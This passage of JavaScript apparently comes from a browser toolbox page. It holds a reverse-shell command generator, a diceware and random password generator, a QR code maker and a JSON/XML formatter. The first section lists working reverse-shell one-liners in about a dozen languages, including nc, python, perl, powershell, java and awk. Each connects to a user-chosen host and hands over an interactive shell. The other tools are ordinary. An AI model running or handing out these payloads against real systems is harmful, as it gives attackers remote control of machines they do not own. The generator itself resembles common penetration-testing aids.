      ['nc (mkfifo)',          ({h, p}) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`],
      ['nc -e (limited build)',({h, p}) => `nc -e /bin/sh ${h} ${p}`],
      ['python3',              ({h, p}) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),i) for i in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`],
      ['python (legacy)',      ({h, p}) => `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),i) for i in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`],
      ['perl',                 ({h, p}) => `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`],
      ['ruby',                 ({h, p}) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${h}","${p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`],
      ['php',                  ({h, p}) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`],
      ['powershell',           ({h, p}) => `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${h}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$z=(iex $d 2>&1|Out-String);$x=$z+'PS '+(pwd).Path+'> ';$y=([text.encoding]::ASCII).GetBytes($x);$s.Write($y,0,$y.Length);$s.Flush()};$c.Close()"`],
      ['java',                 ({h, p}) => `r=Runtime.getRuntime();p=r.exec(new String[]{"/bin/sh","-c","exec 5<>/dev/tcp/${h}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"});p.waitFor();`],
      ['nodejs',               ({h, p}) => `require('child_process').exec('nc -e /bin/sh ${h} ${p}')`],
      ['golang',               ({h, p}) => `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${h}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go`],
      ['awk',                  ({h, p}) => `awk 'BEGIN{s="/inet/tcp/0/${h}/${p}";while(42){do{printf"shell>" |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}} while(c!="exit")close(s)}}' /dev/null`],
      ['lua',                  ({h, p}) => `lua -e 'local s=require("socket").tcp();s:connect("${h}",${p});while true do local r,x=s:receive();local f=io.popen(r,"r");local b=f:read("*a");f:close();s:send(b);end'`],
    ];

    lEl.innerHTML = TPLS.map(([name], i) => `<option value="${i}">${name}</option>`).join('');

    function run() {
      const i = parseInt(lEl.value, 10) || 0;
      const tpl = TPLS[i][1];
      const cmd = tpl({ h: hEl.value || 'HOST', p: pEl.value || 'PORT' });
      out.classList.remove('is-empty');
      out.textContent = cmd;
    }
    [hEl, pEl, lEl].forEach((el) => el.addEventListener('input', run));
    lEl.addEventListener('change', run);
    run();
  }

  // =========================================================
  // Password generator
  // =========================================================
  if ($('pwgen-out')) {
    const modeEl = $('pwgen-mode');
    const lenEl  = $('pwgen-len');
    const goEl   = $('pwgen-go');
    const out    = $('pwgen-out');
    const ent    = $('pwgen-entropy');

    const POOL = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*-_=+';
    // Trimmed EFF-style 4-letter wordlist for diceware demo (actual EFF list would be 7776).
    // 256 words → 8 bits per word, so 4 words ≈ 32 bits; small but illustrative.
    const WORDS = (
      'able acid aged also area army away baby back ball band bank base bath bear beat been beer bell belt best bird ' +
      'blow blue boat body bomb bone book boom born boss both bowl bulk burn bush busy cake call calm came camp card ' +
      'care case cash cast cell chat chip city club coal coat code cold come cook cool cope copy core cost crew crop ' +
      'dark data date dawn days dead deal dean dear debt deep deny desk dial dict diet dirt disc disk does done door ' +
      'dose down draw drew drop drug drum dual duke dust duty each earn ease east easy edge else even ever evil exit ' +
      'face fact fail fair fall farm fast fate fear feed feel feet fell felt file fill film find fine fire firm fish ' +
      'five flag flat flew flow folk food foot ford form fort four free from fuel full fund gain game gate gave gear ' +
      'gene gift girl give glad goal goes gold gone good gray grew grey grow gulf hair half hall hand hang hard harm ' +
      'hate have head hear heat held hell help here hero high hill hire hold hole holy home hope host hour huge hung'
    ).split(' ');

    function entropyBits(len, poolSize) { return Math.round(len * Math.log2(poolSize) * 100) / 100; }

    function gen() {
      if (modeEl.value === 'diceware') {
        const n = 4;
        const words = [];
        const buf = new Uint32Array(n);
        crypto.getRandomValues(buf);
        for (let i = 0; i < n; i++) words.push(WORDS[buf[i] % WORDS.length]);
        const pwd = words.join('-');
        out.classList.remove('is-empty');
        out.textContent = pwd;
        ent.classList.remove('is-empty');
        ent.textContent = `${entropyBits(n, WORDS.length)} bits (${n} words × log2(${WORDS.length}))`;
      } else {
        const len = Math.max(6, Math.min(128, parseInt(lenEl.value, 10) || 20));
        const buf = new Uint32Array(len);
        crypto.getRandomValues(buf);
        let pwd = '';
        for (let i = 0; i < len; i++) pwd += POOL[buf[i] % POOL.length];
        out.classList.remove('is-empty');
        out.textContent = pwd;
        ent.classList.remove('is-empty');
        ent.textContent = `${entropyBits(len, POOL.length)} bits (${len} chars × log2(${POOL.length}))`;
      }
    }
    goEl.addEventListener('click', gen);
  }

  // =========================================================
  // QR code generator (loads qrcode-generator from cdnjs on demand)
  // =========================================================
  if ($('qr-out')) {
    const inEl = $('qr-in');
    const out  = $('qr-out');
    let libPromise = null;
    function loadLib() {
      if (libPromise) return libPromise;
      libPromise = new Promise((resolve, reject) => {
        if (window.qrcode) return resolve();
        const s = document.createElement('script');
        s.src = 'https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js';
        s.crossOrigin = 'anonymous';
        s.onload = resolve;
        s.onerror = () => reject(new Error('failed to load QR library'));
        document.head.appendChild(s);
      });
      return libPromise;
    }
    async function run() {
      const v = inEl.value;
      if (!v) { setOut(out, 'type something', false); return; }
      try {
        await loadLib();
        const qr = window.qrcode(0, 'M');
        qr.addData(v);
        qr.make();
        out.classList.remove('is-empty');
        out.innerHTML = qr.createSvgTag({ scalable: true, margin: 2 });
        const svg = out.querySelector('svg');
        if (svg) { svg.style.width = '100%'; svg.style.maxWidth = '320px'; svg.style.height = 'auto'; svg.style.background = '#fff'; svg.style.padding = '8px'; svg.style.borderRadius = '6px'; }
      } catch (e) {
        setOut(out, '⚠ ' + e.message, false);
      }
    }
    inEl.addEventListener('input', debounce(run, 250));
  }

  // =========================================================
  // JSON / XML formatter
  // =========================================================
  if ($('fmt-out')) {
    const inEl = $('fmt-in');
    const out  = $('fmt-out');
    const prettyBtn = $('fmt-pretty');
    const minBtn    = $('fmt-min');

    function lineColOf(text, idx) {
      let line = 1, col = 1;
      for (let i = 0; i < idx && i < text.length; i++) {
        if (text[i] === '\n') { line++; col = 1; } else col++;
      }
      return { line, col };
    }
    function detect(s) {
      const t = s.trim();
      if (!t) return null;
      if (t[0] === '<') return 'xml';
      return 'json';
    }
    function fmtJson(s, indent) {
      try {
        const obj = JSON.parse(s);
        out.classList.remove('is-empty');
        out.textContent = JSON.stringify(obj, null, indent);
      } catch (e) {
        const m = e.message.match(/position (\d+)/);
        const where = m ? lineColOf(s, parseInt(m[1], 10)) : null;
        setOut(out, '⚠ JSON error' + (where ? ` (line ${where.line}, col ${where.col})` : '') + ': ' + e.message, false);
      }
    }
    function fmtXml(s, indent) {
      try {
        const doc = new DOMParser().parseFromString(s, 'application/xml');
        const err = doc.querySelector('parsererror');
        if (err) { setOut(out, '⚠ XML error: ' + err.textContent.split('\n')[0], false); return; }
        if (indent === 0) {
          out.classList.remove('is-empty');
          out.textContent = new XMLSerializer().serializeToString(doc).replace(/>\s+</g, '><');
          return;
        }
        // Pretty-print
        function fmt(node, depth) {
          const pad = '  '.repeat(depth);
          if (node.nodeType === 1) {
            const attrs = [...node.attributes].map((a) => ` ${a.name}="${a.value}"`).join('');
            const children = [...node.childNodes].filter((c) => c.nodeType !== 3 || c.textContent.trim());
            if (!children.length) return `${pad}<${node.nodeName}${attrs}/>`;
            if (children.length === 1 && children[0].nodeType === 3) {
              return `${pad}<${node.nodeName}${attrs}>${children[0].textContent.trim()}</${node.nodeName}>`;
            }
            return `${pad}<${node.nodeName}${attrs}>\n` +
              children.map((c) => fmt(c, depth + 1)).join('\n') +
              `\n${pad}</${node.nodeName}>`;
          }
          if (node.nodeType === 3) return pad + node.textContent.trim();
          return '';
        }
        out.classList.remove('is-empty');
        out.textContent = fmt(doc.documentElement, 0);
      } catch (e) {
        setOut(out, '⚠ ' + e.message, false);
      }
    }
    function go(indent) {
      const v = inEl.value;
      if (!v.trim()) { setOut(out, 'paste JSON or XML', false); return; }
      const kind = detect(v);
      if (kind === 'json') fmtJson(v, indent);
      else fmtXml(v, indent);
    }
    prettyBtn.addEventListener('click', () => go(2));
    minBtn.addEventListener('click', () => go(0));
  }
})();
